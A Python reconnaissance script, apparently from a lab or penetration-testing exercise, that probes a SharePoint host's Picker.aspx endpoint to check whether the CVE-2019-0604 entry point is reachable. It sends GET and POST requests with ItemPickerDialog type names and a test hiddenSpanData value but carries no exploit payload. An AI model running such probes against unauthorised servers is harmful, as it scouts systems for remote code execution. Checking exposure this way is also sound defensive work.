# Purpose: Test Picker.aspx accessibility with ItemPickerDialog types
# Outcome: Check if CVE-2019-0604 entry point is accessible

import requests

target_base = "http://10.10.10.166"

# ItemPickerDialog types from CVE-2019-0604 research
picker_types = [
    "Microsoft.SharePoint.WebControls.ItemPickerDialog, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c",
    "Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog, Microsoft.SharePoint.Portal, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c",
]

print("[*] Testing Picker.aspx with ItemPickerDialog types...")

for picker_type in picker_types:
    url = f"{target_base}/_layouts/15/Picker.aspx"
    params = {"PickerDialogType": picker_type}
    
    try:
        # Test GET
        r = requests.get(url, params=params, timeout=15, allow_redirects=False)
        print(f"\n[*] GET Picker.aspx with type: {picker_type[:60]}...")
        print(f"    Status: {r.status_code}")
        
        if r.status_code == 200:
            # Check if it returns a form
            has_viewstate = "__VIEWSTATE" in r.text
            has_hidden = "hiddenSpanData" in r.text
            print(f"    Has __VIEWSTATE: {has_viewstate}")
            print(f"    Has hiddenSpanData: {has_hidden}")
            
        # Test POST with hiddenSpanData
        r = requests.post(url, params=params, 
                         data={"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData": "__test"},
                         timeout=15, allow_redirects=False)
        print(f"    POST Status: {r.status_code}")
        
    except Exception as e:
        print(f"\n[*] {picker_type[:50]}...: Error - {e}")

# Test without PickerDialogType parameter
print("\n[*] Testing Picker.aspx without PickerDialogType...")
try:
    r = requests.get(f"{target_base}/_layouts/15/Picker.aspx", timeout=15, allow_redirects=False)
    print(f"    Status: {r.status_code}")
except Exception as e:
    print(f"    Error: {e}")

print("\n[*] Picker.aspx test complete")
